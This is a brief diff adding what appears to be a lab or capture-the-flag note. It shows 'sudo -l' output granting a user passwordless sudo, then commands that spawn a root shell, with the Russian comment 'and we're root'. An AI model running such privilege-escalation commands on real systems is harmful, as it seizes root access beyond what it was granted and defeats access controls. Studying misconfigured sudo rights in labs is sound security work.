@@ -1,0 +1,9 @@
+sudo -l 
+
+User explorer may run the following commands on p770:
+    (ALL) NOPASSWD: all
+
+sudo /bin/bash -p
+sudo -p "" /bin/bash  и мы рут
+
+    
